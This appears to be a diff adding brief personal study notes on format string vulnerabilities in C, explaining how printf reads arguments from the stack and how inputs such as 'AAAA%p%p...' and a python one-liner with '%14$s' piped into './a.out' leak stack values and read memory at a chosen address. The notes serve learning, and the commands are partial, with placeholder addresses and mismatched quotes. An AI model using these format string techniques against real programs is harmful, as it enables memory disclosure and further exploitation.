@@ -1,0 +1,24 @@
+useful technique
+
+
+printf("aaa: %d", 1911)
+aaa:format string
+%d:format specifier
+1911:argument
+
+normally we do like these , pass on argument(value or address)
+but if not do printf("") they just read address from stack ESP.
+
+ESP is the current stack pointer. EBP is the base pointer for the current stack frame.
+
+type
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+to show where the value(AAAA) is stored in stack
+
+python -c \'print \x38\x85... (address) %14$s' | ./a.out (14th stack memory)
+python3 -c "import sys;sys.stdout.buffer.write(b' same as above' )' | ./a.out
+
+pick the 14th argument from the stack
+then 14 th argument is \x38\x85... (address) then read target value
+
+
